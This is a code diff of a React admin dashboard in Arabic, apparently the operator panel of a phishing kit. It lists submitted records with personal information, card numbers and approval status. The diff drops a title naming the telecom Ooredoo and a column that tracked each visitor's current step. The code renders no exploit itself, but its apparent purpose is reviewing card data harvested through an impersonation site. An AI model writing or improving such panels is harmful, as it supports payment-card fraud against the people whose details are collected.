@@ -425,7 +425,7 @@ export default function NotificationsPage() {
     <div dir="rtl" className="min-h-screen bg-background text-foreground p-4">
       <div className="max-w-7xl mx-auto">
         <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
-          <h1 className="text-2xl font-bold mb-4 sm:mb-0">لوحة اوريدووو</h1>
+          <h1 className="text-2xl font-bold mb-4 sm:mb-0">لوحة الإشعارات</h1>
           <div className="flex flex-col sm:flex-row gap-2">
             <Button
               variant="destructive"
@@ -527,7 +527,7 @@ export default function NotificationsPage() {
                 <tr className="border-b border-border">
                   <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة </th>
                   <th className="px-4 py-3 text-right font-medium text-muted-foreground">المعلومات</th>
-                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">الصفحة الحالية</th>
+                  <th className="px-4 py-3 text-right font-medium text-muted-foreground"> الحالة</th>
                   <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
                   <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
                   <th className="px-4 py-3 text-center font-medium text-muted-foreground">العلم</th>
@@ -544,11 +544,11 @@ export default function NotificationsPage() {
                     <td className="px-4 py-3">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.phone ? "default" : "destructive"}
+                          variant={notification.name ? "default" : "destructive"}
                           className="rounded-md cursor-pointer"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
@@ -559,7 +559,7 @@ export default function NotificationsPage() {
                         </Badge>
                       </div>
                     </td>
-                    <td className="px-4 py-3">خطوه - {notification.page}</td>
+                    <td className="px-4 py-3"> {notification.status === 'approved'?<Badge className="bg-green-500">موافق</Badge>:<Badge className="bg-red-500">معلق</Badge>}</td>
                     <td className="px-4 py-3">
                       {notification.createdDate &&
                         formatDistanceToNow(new Date(notification.createdDate), {
@@ -656,11 +656,11 @@ export default function NotificationsPage() {
                     <div className="grid grid-cols-1 gap-3 mb-3">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.phone ? "default" : "destructive"}
+                          variant={notification.name ? "default" : "destructive"}
                           className="rounded-md cursor-pointer"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
@@ -672,7 +672,7 @@ export default function NotificationsPage() {
                       </div>
 
                       <div className="text-sm">
-                        <span className="font-medium">الصفحة الحالية:</span> خطوه - {notification.page}
+                        <span className="font-medium">الحالة:</span>  {notification.status === 'approved'?<Badge className="bg-green-500">موافق</Badge>:<Badge className="bg-red-500">معلق</Badge>}
                       </div>
 
                       <div className="text-sm">
@@ -757,10 +757,10 @@ export default function NotificationsPage() {
                   <span>{selectedNotification.mobile}</span>
                 </p>
               )}
-              {selectedNotification.phone && (
+              {selectedNotification.name && (
                 <p className="flex justify-between">
                   <span className="font-medium">الاسم:</span>
-                  <span>{selectedNotification.phone}</span>
+                  <span>{selectedNotification.name}</span>
                 </p>
               )}
               {selectedNotification.phone && (
